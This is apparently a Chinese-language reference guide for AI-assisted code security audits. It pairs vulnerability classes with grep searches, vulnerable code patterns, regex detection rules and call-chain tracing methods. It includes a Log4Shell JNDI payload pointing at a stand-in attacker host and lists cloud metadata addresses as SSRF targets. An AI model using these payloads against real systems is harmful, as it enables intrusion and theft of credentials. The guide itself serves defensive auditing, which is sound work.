# Semantic Search Guide for Security Audit

> 语义搜索指南 - 借鉴 RAG 增强的代码搜索策略
> 覆盖: 漏洞类型语义查询、调用链追踪、混合搜索策略

---

## Overview

本模块提供语义化的代码搜索策略，帮助审计员更精准地定位安全相关代码。基于 DeepAudit RAG 系统的语义查询模板，结合 Claude Code 的搜索能力。

---

## 漏洞类型 → 语义搜索模板

### Critical 级别

#### SQL 注入
```
语义描述: "用户输入被拼接到SQL查询语句中执行"

关键字搜索:
grep -rn "execute\|query\|cursor" --include="*.py" --include="*.java"

语义搜索建议 (用于 Agent 理解):
- "SQL query execute database user input"
- "动态构造的数据库查询"
- "字符串拼接的SQL语句"

高危模式:
├─ cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")
├─ query = "SELECT * FROM " + table_name
└─ stmt.executeQuery("SELECT * FROM users WHERE name = '" + name + "'")
```

#### 命令注入 / RCE
```
语义描述: "外部输入被传递给系统命令执行函数"

关键字搜索:
grep -rn "exec\|system\|subprocess\|ProcessBuilder\|Runtime" --include="*.py" --include="*.java"

语义搜索建议:
- "system exec command shell subprocess user input"
- "执行系统命令的函数"
- "调用外部程序的代码"

高危模式:
├─ os.system(f"ping {host}")
├─ subprocess.call(cmd, shell=True)
├─ Runtime.getRuntime().exec(userCommand)
└─ new ProcessBuilder(Arrays.asList(cmd.split(" ")))
```

#### 反序列化
```
语义描述: "不可信数据被反序列化为对象"

关键字搜索:
grep -rn "pickle\|yaml\.load\|ObjectInputStream\|readObject\|unserialize" --include="*.py" --include="*.java" --include="*.php"

语义搜索建议:
- "deserialize pickle yaml load object untrusted"
- "将字节流转换为对象"
- "从外部加载序列化数据"

高危模式:
├─ pickle.loads(request.data)
├─ yaml.load(user_input)  # PyYAML < 5.1
├─ ObjectInputStream ois = new ObjectInputStream(inputStream)
└─ unserialize($_GET['data'])
```

#### JNDI 注入
```
语义描述: "用户可控的JNDI查找地址"

关键字搜索:
grep -rn "lookup\|InitialContext\|ldap://\|rmi://" --include="*.java"

语义搜索建议:
- "JNDI lookup context user controlled URL"
- "LDAP或RMI远程查找"

高危模式:
├─ ctx.lookup(userInput)
├─ new InitialContext().lookup("ldap://" + host)
└─ ${jndi:ldap://attacker.com/a}  # Log4Shell
```

### High 级别

#### SSRF
```
语义描述: "服务端根据用户输入发起HTTP请求"

关键字搜索:
grep -rn "requests\.\|urllib\|HttpClient\|fetch\|curl_exec" --include="*.py" --include="*.java" --include="*.js" --include="*.php"

语义搜索建议:
- "HTTP request URL user input fetch internal"
- "根据参数请求外部资源"
- "代理请求或URL重定向"

高危模式:
├─ requests.get(user_url)
├─ urllib.request.urlopen(url)
├─ HttpClient.newHttpClient().send(request)
└─ file_get_contents($_GET['url'])

云环境特别关注:
├─ 169.254.169.254 (AWS/GCP metadata)
├─ metadata.google.internal
└─ 内网IP段 (10.x, 172.16.x, 192.168.x)
```

#### 路径遍历
```
语义描述: "文件路径由用户输入构造"

关键字搜索:
grep -rn "open\|read\|write\|File\|path\.\|os\.path" --include="*.py" --include="*.java" --include="*.js"

语义搜索建议:
- "file path read open user input traversal"
- "根据参数读取或写入文件"
- "文件下载功能"

高危模式:
├─ open(base_path + filename)
├─ new File(uploadDir, userFilename)
├─ fs.readFile(req.params.file)
└─ 未验证 ../ 或 ..\
```

#### 认证绕过
```
语义描述: "认证逻辑存在缺陷或可被绕过"

关键字搜索:
grep -rn "login\|auth\|token\|session\|password\|verify" --include="*.py" --include="*.java" --include="*.js"

语义搜索建议:
- "authentication login password token session verify"
- "用户登录验证逻辑"
- "JWT或Session处理"

高危模式:
├─ if user == "admin":  # 硬编码用户名
├─ jwt.decode(token, verify=False)
├─ alg: none  # JWT算法绕过
└─ 缺少权限检查的API端点
```

#### IDOR / 越权访问
```
语义描述: "通过修改ID参数访问他人资源"

关键字搜索:
grep -rn "user_id\|userId\|id=\|getById\|findById" --include="*.py" --include="*.java" --include="*.js"

语义搜索建议:
- "object ID reference access control ownership"
- "根据ID查询资源"
- "用户资源访问控制"

高危模式:
├─ User.objects.get(id=request.GET['id'])  # 无权限检查
├─ orderService.getOrder(orderId)  # 未验证所有权
└─ /api/users/{id} 可遍历
```

### Medium 级别

#### XSS
```
语义描述: "用户输入被输出到HTML页面"

关键字搜索:
grep -rn "innerHTML\|document\.write\|render\|template\|html\(" --include="*.js" --include="*.html" --include="*.py"

语义搜索建议:
- "HTML render user input innerHTML template output"
- "动态生成HTML内容"
- "模板渲染用户数据"

高危模式:
├─ element.innerHTML = userInput
├─ document.write(data)
├─ render_template_string(user_template)  # Flask SSTI
└─ {{ user_input | safe }}  # 关闭转义
```

#### SSTI (模板注入)
```
语义描述: "用户输入被当作模板代码执行"

关键字搜索:
grep -rn "render_template_string\|Template\|Velocity\|Freemarker\|Jinja" --include="*.py" --include="*.java"

语义搜索建议:
- "template render user input expression evaluation"
- "动态模板渲染"
- "表达式求值"

高危模式:
├─ render_template_string(user_input)  # Flask
├─ template.render({"name": user_input})  # 模板内容可控
├─ Velocity.evaluate(context, user_template)
└─ ${user_input}  # SpEL/OGNL
```

---

## 调用链追踪方法

### 正向追踪 (Source → Sink)

```
目标: 从用户输入追踪到危险函数

步骤:
1. 定位 Source (用户输入点)
   grep -rn "request\.\|@RequestParam\|getParameter\|argv\|input\(" --include="*.py" --include="*.java"

2. 追踪变量传递
   - 变量赋值
   - 函数参数传递
   - 返回值使用

3. 检查是否到达 Sink (危险函数)

示例:
user_id = request.args.get('id')    # Source
    ↓
query = f"SELECT * FROM users WHERE id = {user_id}"    # 传播
    ↓
cursor.execute(query)    # Sink
```

### 反向追踪 (Sink → Source)

```
目标: 从危险函数反向追踪参数来源

步骤:
1. 定位 Sink (危险函数调用)
   grep -rn "execute\|exec\|system" --include="*.py"

2. 分析参数来源
   - 参数是否直接来自用户输入?
   - 参数是否经过函数处理?
   - 参数是否被验证/转义?

3. 追踪调用者
   # 查找谁调用了这个函数
   grep -rn "dangerous_function\s*\(" --include="*.py"

4. 继续递归直到找到 Source
```

### 函数上下文分析

```
目标: 理解函数的完整上下文

1. 定位函数定义
   grep -rn "def function_name\|function function_name" --include="*.py" --include="*.js"

2. 查找调用者 (谁调用了这个函数)
   grep -rn "function_name\s*\(" --include="*.py" --include="*.js"

3. 查找被调用者 (这个函数调用了谁)
   # 读取函数体，提取其中的函数调用

4. 构建调用图
   caller1 ──┐
             ├──► function_name ──┬──► callee1
   caller2 ──┘                    └──► callee2
```

### LSP 精确追踪 (v2.4.0)

> 使用 LSP 替代 grep 实现精确的语义级追踪

**Grep vs LSP 对比**:

| 场景 | Grep 方法 | LSP 方法 | 优势 |
|------|-----------|----------|------|
| 查找调用者 | `grep "func("` | `incomingCalls` | LSP 排除注释/字符串 |
| 查找定义 | `grep "def func"` | `goToDefinition` | LSP 处理重载/多态 |
| 查找实现 | `grep "class.*impl"` | `goToImplementation` | LSP 找到所有实现类 |

**LSP 调用链追踪流程**:

```
场景: 追踪 executeQuery() 的所有调用路径

Step 1: Grep 快速定位 Sink
└─ grep -rn "executeQuery" → UserDao.java:45

Step 2: LSP 追踪调用者
└─ LSP incomingCalls(UserDao.java, 45, 10)
   返回精确调用点 (排除注释和字符串匹配)

Step 3: LSP 递归追踪
└─ 对每个调用者继续 incomingCalls
   直到到达 Controller 层 (HTTP 入口)

Step 4: LSP 追踪污点传播
└─ LSP outgoingCalls 检查数据如何流向 Sink
```

**LSP 操作速查**:

```bash
# 反向追踪: 谁调用了这个函数?
LSP incomingCalls /path/file.java <line> <col>

# 正向追踪: 这个函数调用了什么?
LSP outgoingCalls /path/file.java <line> <col>

# 跳转到定义
LSP goToDefinition /path/file.java <line> <col>

# 查找所有引用
LSP findReferences /path/file.java <line> <col>

# 接口实现 (多态分析)
LSP goToImplementation /path/file.java <line> <col>
```

**最佳实践: Grep + LSP 组合**

```
┌─────────────────────────────────────────────────────────────┐
│                  搜索策略优先级                              │
│                                                             │
│  1. Grep 广度搜索 - 快速发现所有潜在危险点                    │
│     └─ grep -rn "exec|system|eval" --include="*.py"         │
│                                                             │
│  2. LSP 深度追踪 - 精确分析每个危险点                        │
│     └─ incomingCalls → 确认调用链                           │
│     └─ findReferences → 排除误报                            │
│                                                             │
│  原则: Grep 找广度，LSP 求深度                               │
└─────────────────────────────────────────────────────────────┘
```

---

## 混合搜索策略

### 策略1: 关键字 + 上下文

```
步骤:
1. 关键字搜索定位候选位置
   grep -rn "exec\|system" --include="*.py"

2. 读取上下文 (前后各20行)
   # 使用 Read 工具查看完整上下文

3. 分析参数来源和数据流

4. 判断是否可利用
```

### 策略2: 分层搜索

```
Layer 1: 快速扫描 (高置信度模式)
├─ eval(
├─ pickle.loads(
├─ yaml.load(
└─ exec(

Layer 2: 深度扫描 (需要上下文判断)
├─ execute(
├─ query(
├─ open(
└─ request(

Layer 3: 语义分析 (需要理解业务逻辑)
├─ 认证流程
├─ 权限检查
├─ 数据验证
└─ 业务规则
```

### 策略3: 攻击面优先

```
优先级排序:
1. 外部入口点 (API, Controller, Route)
2. 文件处理 (上传, 下载, 读取)
3. 数据库操作 (查询, 更新)
4. 命令执行 (系统调用)
5. 网络请求 (HTTP, DNS)
6. 序列化 (pickle, yaml, JSON)
7. 认证授权 (登录, token, session)
```

---

## 安全指标模式库

### Python

```python
SECURITY_PATTERNS = {
    # Critical
    "exec": r"\bexec\s*\(",
    "eval": r"\beval\s*\(",
    "pickle": r"\bpickle\.loads?\s*\(",
    "yaml_load": r"\byaml\.load\s*\(",
    "subprocess": r"\bsubprocess\.(call|run|Popen)",
    "os_system": r"\bos\.system\s*\(",

    # High
    "sql_execute": r"\.execute\s*\(",
    "sql_format": r"\.execute\s*\(.*[%f\"]",
    "requests": r"\brequests\.(get|post|put|delete)\s*\(",
    "open_file": r"\bopen\s*\([^)]*\+",

    # Sensitive
    "password": r"password\s*=\s*['\"][^'\"]+['\"]",
    "secret": r"secret\s*=\s*['\"][^'\"]+['\"]",
    "api_key": r"api[_-]?key\s*=\s*['\"][^'\"]+['\"]",
}
```

### Java

```java
SECURITY_PATTERNS = {
    // Critical
    "runtime_exec": r"Runtime\.getRuntime\(\)\.exec",
    "process_builder": r"new\s+ProcessBuilder",
    "deserialization": r"ObjectInputStream|readObject",
    "jndi_lookup": r"\.lookup\s*\(",

    // High
    "sql_concat": r"\.executeQuery\s*\(.*\+",
    "sql_format": r"String\.format.*SELECT",
    "mybatis_dollar": r"\$\{[^}]+\}",  // MyBatis

    // Sensitive
    "password_field": r"password\s*=",
    "hardcoded_key": r"(secret|key)\s*=\s*\"[^\"]+\"",
}
```

### JavaScript

```javascript
SECURITY_PATTERNS = {
    // Critical
    "eval": r"\beval\s*\(",
    "function_constructor": r"\bnew\s+Function\s*\(",
    "child_process": r"child_process\.(exec|spawn)",

    // High
    "innerHTML": r"\.innerHTML\s*=",
    "document_write": r"document\.write\s*\(",
    "sql_concat": r"\.query\s*\(.*\+",

    // Prototype Pollution
    "proto": r"__proto__",
    "constructor_prototype": r"constructor\[.*prototype",
}
```

---

## 搜索工作流

### 标准审计流程

```
┌─────────────────────────────────────────────────────────┐
│  Phase 1: 攻击面识别                                      │
│  ├─ 识别入口点 (API, 路由, 控制器)                        │
│  ├─ 识别数据流 (输入 → 处理 → 输出)                       │
│  └─ 识别高危功能 (文件操作, DB操作, 命令执行)              │
├─────────────────────────────────────────────────────────┤
│  Phase 2: 关键字扫描                                      │
│  ├─ 使用安全指标模式库扫描                                │
│  ├─ 标记高风险文件                                        │
│  └─ 生成候选漏洞列表                                      │
├─────────────────────────────────────────────────────────┤
│  Phase 3: 上下文分析                                      │
│  ├─ 读取候选位置上下文                                    │
│  ├─ 追踪数据流 (Source → Sink)                           │
│  └─ 验证是否存在有效净化                                  │
├─────────────────────────────────────────────────────────┤
│  Phase 4: 漏洞验证                                        │
│  ├─ 确认输入可控性                                        │
│  ├─ 确认无有效防护                                        │
│  └─ 构建 PoC                                              │
└─────────────────────────────────────────────────────────┘
```

---

## 参考资源

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Semgrep Rules](https://semgrep.dev/r)
- [CodeQL Queries](https://github.com/github/codeql)

---

**最后更新**: 2026-01-23
**版本**: 1.0.0
